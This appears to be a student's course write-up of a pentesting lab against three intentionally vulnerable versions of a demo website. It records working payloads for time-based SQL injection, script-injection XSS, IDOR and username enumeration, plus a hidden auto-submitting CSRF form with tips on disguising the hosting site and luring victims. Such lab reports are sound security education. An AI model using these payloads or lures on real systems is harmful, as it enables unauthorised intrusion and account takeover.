# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Vulnerabilities Common To All Targets.

### Vulnerability #1: Directory Traversal

URL: https://35.184.88.145/blue/
URL: https://35.184.88.145/red/
URL: https://35.184.88.145/green/

REFERENCES:

[CWE 548](https://cwe.mitre.org/data/definitions/548.html)

ANALYSIS:
It is possible to view the directory listing. Directory listing may reveal hidden scripts, include files, backup source files etc which can be accessed to read sensitive information. To correct this routing for /Blue/ should result routing the user to /blue/public/. 

SCREENSHOTS:

STEPS TO RECREATE:
1. simply navigate to any of the following links.

[blue](https://35.184.88.145/blue/)

[red](https://35.184.88.145/red/)

[green](https://35.184.88.145/green/)


INFORMATION EXTRACTED:
Apache/2.4.18 (Ubuntu) Server at 35.184.88.145 Port 443

## Blue Target

### Vulnerability #1: SQL Injection (SQLi)

URL: https://35.184.88.145/blue/public/salesperson.php?id=7%27%20OR%20SLEEP(5)--%27 

VULNERABILITY:

[CWE 89](https://cwe.mitre.org/data/definitions/89.html)

ANALYSIS:
The page results were successfully manipulated using the boolean conditions [7' AND '1'='1' -- ] and [7' AND '1'='2' -- ]
The parameter value being modified was NOT stripped from the HTML output for the purposes of the comparison
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter

The vulnerability is confirmed by using [id=7' OR SLEEP(5)=0-- ] will cause the site to wait 5 seconds before loading.

SCREENSHOTS:
![image walkthrough](./images/LivePentest_blue_SQLI.gif)

STEPS TO RECREATE:
1. Navigate to the link below.
- [Blue Salesperson](https://35.184.88.145/blue/public/salesperson.php?id=7)
2. Append the following code to the end of the address.
```
' OR SLEEP(5)=0--'
```
3. you will then see that it takes five seconds for the page to refresh. You can further test this by changing the ID of the salesperson that you want to see.

### Vulnerability #2:

SCREENSHOTS:

### Bonus Objective: SQL Injection (SQLi)

Build on SQL Injection. Experiment to see what other kinds of information you can get the database to reveal.


## Green Target

### Vulnerability #1: Username Enumeration

URL: https://35.184.88.145/green/public/staff/login.php

VULNERABILITY:

[CWE 203](https://cwe.mitre.org/data/definitions/203.html)

[OWASP Information Leakage and Improper Error Handling](https://www.owasp.org/index.php/Top_10_2007-Information_Leakage_and_Improper_Error_Handling)

ANALYSIS:
The username error markup is generated differently depending upon if an acutal or incorrect user name is presented.

If an incorrect username is presented the error shows as bold text and this is the result of the below class tag.
```html
<li>
	<span class="failed">
		Log in was unsuccessful.
	</span>
</li>
```

If a correct username is presented the error shows as normal text and this the result of below class tag.
```html
<li>
	<span class="failure">
		Log in was unsuccessful.
	</span>
</li>
```

SCREENSHOTS:
![image walkthrough](./images/LivePentest_green_UserEnumeration.gif)

STEPS TO RECREATE:
1. navigate to [blue login](https://35.184.88.145/green/public/staff/login.php)
2. Try a known username such as the defualt ```pperson``` with an incorrect password in order to cuase a login error..
 - Notice the error message styling.
3. Try an uknown usernamne such as ```person``` with another passowrd.
 - Notice the modified error message styling. 

### Vulnerability #2: Cross-Site Scripting (XSS)

URL: https://35.184.88.145/green/public/contact.php

VULNERABILITY:
[CWE 79](https://cwe.mitre.org/data/definitions/79.html)

ANALYSIS:
Both the name and feedback fields are vulnerable to a run of the mill XSS attack.
To create this vulnerability I used the following simple snippets in their respective prompts.

In the name field:
```
<script>alert('HS found the name field XSS Vulnerability!');</script>
```
In the feedback field:
```
<script>alert('HS found the feedback field XSS Vulnerability!');</script>
```
To mitigate this vulnerability the site developer should sanitize the user input sanitization. Some examples of input sanitization are [bleach](https://bleach.readthedocs.io/en/latest/clean.html) for Python or directly through [php sanitization](http://php.net/book.filter).

SCREENSHOTS:
![image walkthrough](./images/LivePentest_green_XSS.gif)

STEPS TO RECREATE:
1. navigate to [Green Contact Page](https://35.184.88.145/green/public/contact.php)
2. Insert the below script types in their repsective fields.
NAME:
```
<script>alert('The name field is Vulnerable!');</script>
```
FEEDBACK:
```
<script>alert('The feedback field is Vulnerable!');</script>
```
3. Log into the green site.
4. click on the feedback button.
5. The explots should be displayed.

### Bonus Objective: Cross-Site Scripting (XSS)

a. direct the user to a new URL
b. read cookie data
c. set cookie data.

### Advanced Objective: Cross-Site Scripting (XSS) and Session Hijacking/Fixation

Are you able to execute a session hijacking or fixation attack using XSS instead of using the provided PHP script?



## Red Target

### Vulnerability #1: Insecure Direct Object Reference (IDOR)

URL: https://35.184.88.145/red/public/salesperson.php?id=1

VULNERABILITY:

[CWE 202](https://cwe.mitre.org/data/definitions/202.html)

[CWE 932](https://cwe.mitre.org/data/definitions/932.html)

[OWASP Insecure Direct Object Request](https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References)

ANALYSIS:
The page results were successfully manipulated using IDs 10 and 11 in the get request or address bar.
The parameter value being modified was NOT restricted and thus the nature of this exploit is the result of allowing unathenitcated or authorized users to query the ID of sales people who should not be avaialble to the public.
The situion could have been mitigated simply by checking of the user is authenticated and authorized or simply restricting querying the database to only outside sales people who were approved for direct contact with customers.

SCREENSHOTS:
![image walkthrough](./images/LivePentest_red_IDOR.gif)

STEPS TO RECREATE:
1. Navigate to the [Green salesperson site](https://35.184.88.145/red/public/territories.php)
2. Click on one of the sales people.
3. Notce that the url ```https://35.184.88.145/red/public/salesperson.php?id=1``` ends with ```id=<some number>```
4. Put either ```id=10``` or ```id=11``` after the ? in the URL.
5. Notice that both of those pull up sales people that were either fired or are not currently available.

### Vulnerability #2: Cross-Site Request Forgery (CSRF)

VULNERABILITY:

[CWE 352](https://cwe.mitre.org/data/definitions/352.html)

ANALYSIS:

Eventhough the page in question has a CSRF token it appears that said token is not being validated.

SCREENSHOTS:

![image walkthrough](./images/LivePentest_red_CSRF.gif)

STEPS TO RECREATE:

1. Create a website to launch the explot from. It is reccomended that this site look legitimate so that you can conceal your actual intentions.
2. in your site customize the code below substituting out your desired creentials inside the form and your sites' url inside the action field. Pay close attention to follow the password guidelines specified by the site you want to exploit.
```html
<form style="display: none;" name="csrfForm" action="TODO" method="POST" target="hidden_results">
	 	<input type="text" name="first_name" value="TODO" />
	 	<input type="text" name="last_name" value="TODO" />
	 	<input type="text" name="username" value="TODO">
	 	<input type="text" name="email" value="TODO">
	 	<input type="password" name="password" value="TODO">
	 	<input type="password" name="confirm_password" value="TODO">
	 	<input type="submit"/>
	</form>
	<iframe name="hidden_results" style="display: none;"></iframe>
	<script>
		 	document.csrfForm.submit();
	</script>
```
3. Use a bit of social engineering on the contact form to get someone to visit your site.
4. log in with the credentials you specified.
- The results of the created user can be verified by logging. in a d going to the users tab.
